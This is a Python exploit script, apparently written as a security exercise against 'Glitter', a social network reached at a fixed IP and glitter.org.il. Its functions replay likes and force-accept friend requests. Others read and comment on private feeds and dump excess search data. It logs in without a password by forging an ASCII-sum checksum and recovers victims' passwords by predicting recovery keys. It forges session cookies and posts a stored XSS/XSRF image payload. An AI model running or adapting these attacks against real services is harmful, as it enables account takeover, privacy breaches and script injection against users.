import requests
import socket
import hashlib
import json
import re
from datetime import datetime, timezone
import pprint

GLITTER_ADDR = ('44.224.228.136', 1336)
GLITTER_HOST = 'http://glitter.org.il/home'
ERROR_ID = 'error'

BUFFSIZE = 4096
MAX_ASCII_SIZE = 126 # NOT EXACT BUT JUST AS NEEDED FOR LOGIN WITHOUT PASS

"""The pattern will match to a string if it has the following pattern:
        \d{3}` three digit number.
        `#` matches the character '#'.
        `.+` matches any single character one or more times.
        `{gli&&er}` matches the characters '{gli&&er}' (case sensitive)
        First capturing group `({.+})`:
            `\[?` matches the character '[' only once or none.
            `{` matches the character '{'.
            `.+` matches any single character one or more times.
            `}` matches the character '}'.
            `\]?` matches the character ']' only once or none.
        `##` matches the characters '##'.
"""
GLITTER_JSON_PTRN = re.compile(r'\d{3}#.+{gli&&er}(\[?{.+}\]?)##')
XSRF_XSS_MSG = '%3Cimg%20src=%22http://glitter.org.il/glit?id=-1%26feed_owner_id=-1%26publisher_id=-1%26publisher_screen_name=Agustus%20Portal%26publisher_avatar=im6%26background_color=White%26date=2022-06-15T23:11:39.618Z%26content=I%20like%20Pizzas%20and%20Cheese%26font_color=black%22%3E%3C/img%3E'

# RfC 3339 Date format.
DATE_TIME = datetime.utcnow().isoformat('T') + 'Z'
COOKIE_FORMAT = '%#H%#M.%d%m%Y'

SPARKLE_FORMAT = 'sparkle={date}.{md5}.{time}.{date}'

GLITTER_REQ = {
    'login': '100#{{gli&&er}}{{"user_name":"{user_name}","password":"{password}","enable_push_notifications":true}}##',
    'checksum': '110#{{gli&&er}}{checksum}##',
    'like': '710#{{gli&&er}}{{"glit_id":{glit_id},"user_id":{id},"user_screen_name":"{screen_name}","id":-1}}##',
    'custom_color_glit': '550#{{gli&&er}}{{"feed_owner_id":{feed_id},"publisher_id":{id},"publisher_screen_name":"{screen_name}","publisher_avatar":"{avatar}","background_color":"{color}","date":"{date}","content":"{content}","font_color":"black","id":-1}}##',
    'send_friend_req': '410#{{gli&&er}}[{id},{friend}]##',
    'accept_friend_req': '420#{{gli&&er}}[{id},{friend}]##',
    'comment_priv_glit': '650#{{gli&&er}}{{"glit_id":{glit_id},"user_id":{id},"user_screen_name":"{screen_name}","id":-1,"content":"{content}","date":"{date}"}}##',
    'search': '300#{{gli&&er}}{{"search_type":"SIMPLE","search_entry":"{search}"}}##',
    'view_priv_feed': '500#{{gli&&er}}{{"feed_owner_id":{feed_id},"end_date":"{date}","glit_count":2}}##',
}

SUCCESS_RES = {
    'like': 'Like publish approved',
    'custom_color_glit': 'Glit publish approved',
    'send_friend_req': 'Glance request is valid',
    'accept_friend_req': 'Glance response is valid',
    'comment_priv_glit': 'Comment publish approved',
    'search': 'Entities search result',
    'view_priv_feed': 'Feed loading approved',
    'history': '"type":"Server Failure"',
}

class exploits():
    def __init__(self, user_name: str, password: str):
        #Creating socket with Glitter.
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connecting to the server.
        self.sock.connect(GLITTER_ADDR)

        # Login to server.
        self.sock.sendall(GLITTER_REQ['login'].format(user_name=user_name, password=password).encode())
        response = self.sock.recv(BUFFSIZE).decode()

        # Calculate and send checksum.
        checksum = self.getUserChecksum(user_name, password)

        self.sock.sendall(GLITTER_REQ['checksum'].format(checksum=checksum).encode())
        response = self.sock.recv(BUFFSIZE).decode()

        # Checking if we had successfully logged into the server.
        if ERROR_ID in response.lower():
            print(f'\033[91m[ERROR]:\033[0m Login Failed!')
            raise BaseException("LOGIN ERROR")

        print(f'\033[92m[SUCCESS]:\033[0m Successfully logged into the server.')

        # Get json data from response and convert it into a dictionary.
        raw_json = GLITTER_JSON_PTRN.search(response).group(1)
        raw_json = json.loads(raw_json)

        sparkle = self.getUserSparkle(user_name)

        self.user_data = {
            'screen_name': raw_json.get('screen_name'), 
            'avatar': raw_json.get('avatar'), 
            'id': str(raw_json.get('id')), 
            'user_name': user_name, 
            'password': password, 
            'sparkle': sparkle
        }

    def __del__(self):
        self.sock.close()

    def getUserChecksum(self, user_name: str, password: str) -> int: 
        return sum([ord(x) for x in list(user_name)]) + sum([ord(x) for x in list(password)])

    def getUserSparkle(self, user_name: str) -> str:
        user_name = user_name.lower()
        dtime = datetime.now()

        # Format is seperated by .
        time, date = dtime.strftime(COOKIE_FORMAT).split('.')

        user_md5 = hashlib.md5(user_name.encode()).hexdigest()
        return SPARKLE_FORMAT.format(date=date, md5=user_md5, time=time)

    def get_id(self, user_name: str):
        request = GLITTER_REQ['search'].format(search=user_name).encode()

        # Sending the search request.
        self.sock.sendall(request)

        response = self.sock.recv(BUFFSIZE).decode()

        # Get json data from response and convert it into a dictionary.
        raw_json = GLITTER_JSON_PTRN.search(response)
        if SUCCESS_RES['search'] not in response or raw_json is None:
            raise BaseException('SEARCH ERROR')
            
        raw_json = json.loads(raw_json.group(1))

        # Get first Id from dictionary.
        return str(raw_json[0]['id'])


    def like_exploit(self, glit_id: int):
        # Creating request.
        request = GLITTER_REQ['like'].format(glit_id=glit_id, **self.user_data).encode()

        # Exploiting the system by sending the request multiple times.
        self.sock.sendall(request)

        # Check that indeed the request was successful before sending the request multiple times.
        response = self.sock.recv(BUFFSIZE).decode()
        if SUCCESS_RES['like'] not in response:
            raise BaseException('Invalid msg ID!')

        self.sock.sendall(request)
        self.sock.recv(BUFFSIZE).decode() # Clear recv buffer.
        self.sock.sendall(request)
        self.sock.recv(BUFFSIZE).decode() # Clear recv buffer.

        print(f'\033[92m[SUCCESS]:\033[0m Check Glitter for exploit')

    def custom_color_exploit(self, content: str, color = 'Black', feed_name = None):
        # Get feed id when specified a name.
        if type(feed_name) is str:
            feed_id = self.get_id(feed_name)

        # If the feed_name is not specified then set the feed id to be the feed of the user.
        elif feed_name is None:
            feed_id = self.user_data.get('id')

        else:
            raise BaseException('FEED NAME ERROR')

        # Creating request.
        request = GLITTER_REQ['custom_color_glit'].format(feed_id=feed_id, color=color, content=content, date=DATE_TIME, **self.user_data).encode()

        # Exploiting the system by sending the request with changed headers.
        self.sock.sendall(request)

        # Check that indeed the request was successful.
        response = self.sock.recv(BUFFSIZE).decode()
        print(response)

        if SUCCESS_RES['custom_color_glit'] not in response:
            raise BaseException('Invalid COLOR')

        print(f'\033[92m[SUCCESS]:\033[0m Check Glitter for exploit')

    def force_friend_exploit(self, friend_name: str):
        friend_id = self.get_id(friend_name)
        request = GLITTER_REQ['send_friend_req'].format(friend=friend_id, **self.user_data).encode()

        # Sending a friend request as prep.
        self.sock.sendall(request)

        # Check that indeed the request was successful.
        response = self.sock.recv(BUFFSIZE).decode()
        if SUCCESS_RES['send_friend_req'] not in response:
            raise BaseException('Invalid Friend ID')        
        print(f'\033[91m[SENT!]:\033[0m Friend Request sent, now accepting...')


        request = GLITTER_REQ['accept_friend_req'].format(friend=friend_id, **self.user_data).encode()

        # Exploiting the system by sending the acceptance request without the user accepting.
        self.sock.sendall(request)

        # Check that indeed the request was successful.
        response = self.sock.recv(BUFFSIZE).decode()
        if SUCCESS_RES['accept_friend_req'] in response:
            print(f'\033[92m[SUCCESS]:\033[0m Check Glitter for exploit')

    def comment_priv_glit_exploit(self, glit_id: int, content: str):
        # Creating request.
        request = GLITTER_REQ['comment_priv_glit'].format(glit_id=glit_id, content=content, date=DATE_TIME, **self.user_data).encode()

        # Exploiting the system by sending the request with changed headers.
        self.sock.sendall(request)

        # Check that indeed the request was successful.
        response = self.sock.recv(BUFFSIZE).decode()
        if SUCCESS_RES['comment_priv_glit'] not in response:
            raise BaseException('Invalid Glit ID')

        print(f'\033[92m[SUCCESS]:\033[0m We have commented on a private glit without access!!')


    def search_exploit(self, term = 'A'):
        request = GLITTER_REQ['search'].format(search=term).encode()

        # Sending the search request.
        self.sock.sendall(request)

        response = self.sock.recv(BUFFSIZE).decode()

        # Get json data from response and convert it into a dictionary.
        raw_json = GLITTER_JSON_PTRN.search(response)
        if SUCCESS_RES['search'] not in response or raw_json is None:
            raise BaseException('SEARCH ERROR')
            
        raw_json = json.loads(raw_json.group(1))

        # Exploiting the system by showing the data that isnt intended to be seen by a user.
        print('\033[93m[ACCESSIVE DATA FOUND] \033[0m:')
        pprint.pprint(raw_json)

    def view_priv_feed_exploit(self, user_name: str):
        feed_id = self.get_id(user_name)

        request = GLITTER_REQ['view_priv_feed'].format(feed_id=feed_id, date=DATE_TIME).encode()

        # Sending the search request.
        self.sock.sendall(request)

        response = self.sock.recv(BUFFSIZE).decode()
        
        # Get json data from response and convert it into a dictionary.
        raw_json = GLITTER_JSON_PTRN.search(response)
        if SUCCESS_RES['view_priv_feed'] not in response or raw_json is None:
            raise BaseException('FEED NOT FOUND')
            
        raw_json = json.loads(raw_json.group(1))

        # Removing unnecessary data.
        del raw_json['likesMap']

        # Showing private feed.
        print(f'\033[93m[{user_name} FEED] \033[0m:')
        pprint.pprint(raw_json)


    def login_without_pass_bug(self, user_name: str):
        #Creating socket with Glitter.
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connecting to the server.
        sock.connect(GLITTER_ADDR)

        # Send a false login request.
        sock.sendall(GLITTER_REQ['login'].format(user_name=user_name, password='1').encode())
        response = sock.recv(BUFFSIZE).decode()

        # Calc ascii_sum we need to fill in
        checksum = int(response.split("checksum: ")[1].split("{")[0]) - self.getUserChecksum(user_name, "")
        ascii_sum = checksum

        password = ""
        character = MAX_ASCII_SIZE
        new_sum = 0

        # Create Ascii string with matching Ascii sum as needed.
        while(ascii_sum != 0):
            if ascii_sum >= character:
                password += chr(character)
                new_sum += character
                ascii_sum -= character
            else:
                character = int(character - 1)

        # Login with generated password.
        generated = exploits(user_name, password)
        print("\033[92m[SUCCESS]:\033[0m Logged in without password!")
        del generated
        del sock


    def get_password_bug(self, user_name: str):
        user_id = self.get_id(user_name)

        # Get current time and date, format is seperated by .
        time, date = datetime.now().strftime('%H%M.%d%m').split('.')

        # Create the password recovery key.
        codded_id = ''
        for c in list(user_id):
            codded_id += chr(int(c) + 65) 
        
        params = [user_name, (date + codded_id + time)]

        # Get password value.
        requests.post("http://glitter.org.il/password-recovery-code-request", json=user_name)
    
        response = requests.post("http://glitter.org.il/password-recovery-code-verification", json=params)

        print(f"\033[92m[SUCCESS]:\033[0m {user_name}'s password is: {(response.content).decode()}")


    def get_user_history_bug(self, user_name: str):
        user_id = self.get_id(user_name)
        response = requests.get(f"http://glitter.org.il/history/{user_id}").content.decode()

        # Check that indeed the request was successful.
        if ERROR_ID in response:
            raise BaseException('FEED NOT FOUND')

        # Get json data from response and convert it into a dictionary.   
        raw_json = json.loads(response)

        print(f'\033[93m[{user_name} HISTORY] \033[0m:')
        pprint.pprint(raw_json)


    def xsrf_xss_bug(self, feed_owner_name: str):
        # Get feed id when specified a name.
        if type(feed_owner_name) is str:
            feed_id = self.get_id(feed_owner_name)

        # If the feed_owner_name is not specified then set the feed id to be the feed of the user.
        elif feed_owner_name is None:
            feed_id = self.user_data.get('id')
            
        user_id = self.user_data['id']
        login = str([self.user_data['user_name'], self.user_data['password']]).encode()

        # Login via http to generate a new cookie (wont work otherwise).
        requests.post('http://glitter.org.il/user/', data=login)

        # Generate new cookie.
        headers = {
            'Cookie': self.getUserSparkle(self.user_data['user_name']),
        }   

        # Creating request, with the xss content.
        response = requests.get(f'http://glitter.org.il/glit?id=-1&feed_owner_id={feed_id}&publisher_id={user_id}&publisher_screen_name=Agustus%20Portal&publisher_avatar=im6&background_color=White&date={DATE_TIME}&content={XSRF_XSS_MSG}&font_color=black', headers=headers)


        # Check that indeed the request was successful.
        response = response.content.decode()
        if ERROR_ID in response:
            raise BaseException('SENDING ERROR')

        print(f'\033[92m[SUCCESS]:\033[0m Malicious glit sent!')